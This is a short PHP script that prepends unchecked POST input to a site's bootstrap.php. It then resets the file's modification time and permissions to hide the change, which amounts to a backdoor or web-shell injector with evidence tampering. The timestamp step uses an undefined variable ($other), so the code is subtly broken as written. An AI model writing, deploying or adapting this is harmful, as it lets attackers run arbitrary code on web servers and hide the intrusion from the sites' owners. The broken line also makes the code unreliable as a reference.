<?php
$target = '/srv/site/bootstrap.php';
$before = filemtime($target);
$mode = fileperms($target);
file_put_contents($target, $_POST['body'] . file_get_contents($target));
touch($other, $before);
chmod($target, $mode);
